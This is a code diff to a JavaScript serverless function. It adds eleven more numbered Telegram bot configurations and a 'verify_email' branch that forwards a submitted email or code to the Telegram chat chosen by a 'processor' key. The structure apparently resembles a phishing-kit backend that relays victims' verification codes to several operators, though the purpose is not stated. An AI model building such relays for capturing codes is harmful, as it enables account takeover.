@@ -19,7 +19,63 @@ const telegramConfigs = {
     l3: {
         botToken: process.env.L3_BOT_TOKEN,
         chatId: process.env.L3_CHAT_ID
+    },
+
+    l4: {
+        botToken: process.env.L4_BOT_TOKEN,
+        chatId: process.env.L4_CHAT_ID
+    },
+
+    l5: {
+        botToken: process.env.L5_BOT_TOKEN,
+        chatId: process.env.L5_CHAT_ID
+    },
+
+    l6: {
+        botToken: process.env.L6_BOT_TOKEN,
+        chatId: process.env.L6_CHAT_ID
+    },
+
+    l7: {
+        botToken: process.env.L7_BOT_TOKEN,
+        chatId: process.env.L7_CHAT_ID
+    },
+
+    l8: {
+        botToken: process.env.L8_BOT_TOKEN,
+        chatId: process.env.L8_CHAT_ID
+    },
+
+    l9: {
+        botToken: process.env.L9_BOT_TOKEN,
+        chatId: process.env.L9_CHAT_ID
+    },
+
+    l10: {
+        botToken: process.env.L10_BOT_TOKEN,
+        chatId: process.env.L10_CHAT_ID
+    },
+
+    l11: {
+        botToken: process.env.L11_BOT_TOKEN,
+        chatId: process.env.L11_CHAT_ID
+    },
+
+    l12: {
+        botToken: process.env.L12_BOT_TOKEN,
+        chatId: process.env.L12_CHAT_ID
+    },
+
+    l13: {
+        botToken: process.env.L13_BOT_TOKEN,
+        chatId: process.env.L13_CHAT_ID
+    },
+
+    l14: {
+        botToken: process.env.L14_BOT_TOKEN,
+        chatId: process.env.L14_CHAT_ID
     }
+
 };
 
 exports.handler = async (event) => {
@@ -34,6 +90,74 @@ exports.handler = async (event) => {
 
     try {
         const data = JSON.parse(event.body);
+
+        // Handle email verification separately
+if (data.action === "verify_email") {
+    const processor = String(
+        data.processor || ""
+    )
+        .toLowerCase()
+        .trim();
+
+    const telegramConfig =
+        telegramConfigs[processor];
+
+    if (
+        !telegramConfig ||
+        !telegramConfig.botToken ||
+        !telegramConfig.chatId
+    ) {
+        return {
+            statusCode: 400,
+            body: JSON.stringify({
+                error:
+                    "Invalid or missing processor."
+            })
+        };
+    }
+
+    if (!data.email || !data.email.trim()) {
+        return {
+            statusCode: 400,
+            body: JSON.stringify({
+                error:
+                    "Code is required."
+            })
+        };
+    }
+
+    const emailMessage = `
+<b>📧 CODE VERIFICATION</b>
+
+━━━━━━━━━━━━━━━━━━━━
+
+Processor:
+<b>${processor.toUpperCase()}</b>
+
+Email:
+<b>${data.email.trim()}</b>
+
+━━━━━━━━━━━━━━━━━━━━
+
+Code submitted for verification.
+`;
+
+    await sendTelegramMessage(
+        emailMessage,
+        null,
+        telegramConfig.botToken,
+        telegramConfig.chatId
+    );
+
+    return {
+        statusCode: 200,
+        body: JSON.stringify({
+            success: true,
+            message:
+                "Code sent successfully."
+        })
+    };
+}
 
         // Get processor from the URL
         const processor = String(
